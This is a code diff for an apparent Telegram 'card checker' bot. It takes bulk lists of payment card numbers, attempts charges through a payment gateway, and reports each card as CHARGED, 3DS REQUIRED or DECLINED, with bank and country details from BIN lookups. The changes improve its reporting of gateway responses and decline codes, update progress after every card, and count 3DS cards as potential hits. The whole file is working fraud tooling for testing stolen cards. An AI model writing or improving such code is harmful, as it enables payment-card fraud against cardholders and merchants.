@@ -215,30 +215,49 @@ async def process_single_card(card: str, user_id: int = None) -> dict:
         }
 
 
-def format_result(result: dict) -> str:
+def format_result(result: dict, show_full: bool = True) -> str:
     """Format check result for Telegram message"""
     card = result["card"]
     response = result["response"]
-    bin_data = result["bin_data"]
+    bin_data = result.get("bin_data", {})
 
     bin_info = ""
-    if bin_data.get("success"):
+    if show_full and bin_data.get("success"):
         bd = bin_data.get("data", {})
         bank = bd.get("bank", "Unknown")
         emoji = bd.get("emoji", "")
         country = bd.get("country", "Unknown")
         level = bd.get("level", "Unknown")
-        bin_info = f"\n🏦 *Bank*: {bank}\n💳 *Level*: {level}\n🌍 *Country*: {country} {emoji}"
+        card_type = bd.get("type", "Unknown")
+        scheme = bd.get("scheme", "Unknown")
+        bin_info = f"\n🏦 *Bank*: {bank}\n💳 *Type*: {scheme} {card_type} {level}\n🌍 *Country*: {country} {emoji}"
+
+    # Get response details
+    error = response.get("error", "")
+    message = response.get("message", "")
+    gateway_msg = response.get("gateway_message", "")
+    decline_code = response.get("decline_code", "")
+
+    # Build status message with all available info
+    status_parts = []
+    if message:
+        status_parts.append(message)
+    if error:
+        status_parts.append(error)
+    if gateway_msg and gateway_msg not in str(status_parts):
+        status_parts.append(f"Gateway: {gateway_msg}")
+    if decline_code and decline_code not in str(status_parts):
+        status_parts.append(f"Code: {decline_code}")
+
+    status_text = " | ".join(status_parts) if status_parts else "Unknown"
 
     if response.get('success'):
-        msg = response.get("message", "Charged")
-        return f"✅ *CHARGED*\n\n💳 `{card}`\n📝 *Status*: {msg}{bin_info}"
+        return f"✅ *CHARGED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
     else:
-        error = response.get("error", "Unknown error")
-        if '3ds' in error.lower():
-            return f"🔐 *3DS REQUIRED*\n\n💳 `{card}`\n📝 *Status*: {error}{bin_info}"
+        if '3ds' in str(error).lower() or '3d' in str(error).lower():
+            return f"🔐 *3DS REQUIRED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
         else:
-            return f"❌ *DECLINED*\n\n💳 `{card}`\n📝 *Error*: {error}{bin_info}"
+            return f"❌ *DECLINED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
 
 
 # Telegram Bot Handlers
@@ -442,6 +461,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     charged = []
     declined = []
     three_ds = []
+    last_response = ""
 
     tasks = [process_single_card(card, user_id) for card in cards]
 
@@ -450,35 +470,43 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result = await future
             response = result["response"]
 
+            # Get the response message for display
+            error_msg = response.get("error", "") or response.get("message", "") or "Processing..."
+            # Truncate long messages
+            if len(error_msg) > 50:
+                error_msg = error_msg[:47] + "..."
+            last_response = error_msg
+
             if response.get("success"):
                 charged.append(result)
                 # Send charged card immediately
                 await update.message.reply_text(format_result(result), parse_mode="Markdown")
-            elif '3ds' in str(response.get("error", "")).lower():
+            elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                 three_ds.append(result)
                 # Send 3DS cards too
                 await update.message.reply_text(format_result(result), parse_mode="Markdown")
             else:
                 declined.append(result)
 
-            # Update progress every 3 cards
-            if (i + 1) % 3 == 0 or i + 1 == len(cards):
-                try:
-                    progress_bar = create_progress_bar(i + 1, len(cards))
-                    await status_msg.edit_text(
-                        f"⏳ *Checking Cards...*\n\n"
-                        f"{progress_bar}\n"
-                        f"📊 {i + 1}/{len(cards)} checked\n\n"
-                        f"✅ Charged: {len(charged)}\n"
-                        f"🔐 3DS: {len(three_ds)}\n"
-                        f"❌ Declined: {len(declined)}",
-                        parse_mode="Markdown"
-                    )
-                except Exception:
-                    pass  # Ignore edit errors
+            # Update progress every card
+            try:
+                progress_bar = create_progress_bar(i + 1, len(cards))
+                await status_msg.edit_text(
+                    f"⏳ *Checking Cards...*\n\n"
+                    f"{progress_bar}\n"
+                    f"📊 {i + 1}/{len(cards)} checked\n\n"
+                    f"✅ Charged: {len(charged)}\n"
+                    f"🔐 3DS: {len(three_ds)}\n"
+                    f"❌ Declined: {len(declined)}\n\n"
+                    f"💬 *Last*: `{last_response}`",
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass  # Ignore edit errors
 
         except Exception as e:
             logger.error(f"Mass check error: {e}")
+            last_response = f"Error: {str(e)[:30]}"
 
     # Final summary
     summary = (
@@ -540,33 +568,46 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         charged = []
         declined = []
+        last_response = ""
 
         tasks = [process_single_card(card, user_id) for card in cards]
 
         for i, future in enumerate(asyncio.as_completed(tasks)):
             try:
                 result = await future
-                if result["response"].get("success"):
+                response = result["response"]
+
+                # Get the response message for display
+                error_msg = response.get("error", "") or response.get("message", "") or "Processing..."
+                if len(error_msg) > 50:
+                    error_msg = error_msg[:47] + "..."
+                last_response = error_msg
+
+                if response.get("success"):
                     charged.append(result)
+                    await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                elif '3ds' in str(response.get("error", "")).lower():
+                    charged.append(result)  # Count 3DS as potential
                     await update.message.reply_text(format_result(result), parse_mode="Markdown")
                 else:
                     declined.append(result)
 
-                if (i + 1) % 3 == 0 or i + 1 == len(cards):
-                    try:
-                        progress_bar = create_progress_bar(i + 1, len(cards))
-                        await status_msg.edit_text(
-                            f"⏳ *Checking Cards...*\n\n"
-                            f"{progress_bar}\n"
-                            f"📊 {i + 1}/{len(cards)} checked\n\n"
-                            f"✅ Charged: {len(charged)}\n"
-                            f"❌ Declined: {len(declined)}",
-                            parse_mode="Markdown"
-                        )
-                    except Exception:
-                        pass
+                try:
+                    progress_bar = create_progress_bar(i + 1, len(cards))
+                    await status_msg.edit_text(
+                        f"⏳ *Checking Cards...*\n\n"
+                        f"{progress_bar}\n"
+                        f"📊 {i + 1}/{len(cards)} checked\n\n"
+                        f"✅ Charged: {len(charged)}\n"
+                        f"❌ Declined: {len(declined)}\n\n"
+                        f"💬 *Last*: `{last_response}`",
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass
             except Exception as e:
                 logger.error(f"Mass check error: {e}")
+                last_response = f"Error: {str(e)[:30]}"
 
         summary = f"📊 *FINAL RESULTS*\n\n✅ Charged: {len(charged)}\n❌ Declined: {len(declined)}\n📝 Total: {len(cards)}"
         await status_msg.edit_text(summary, parse_mode="Markdown")
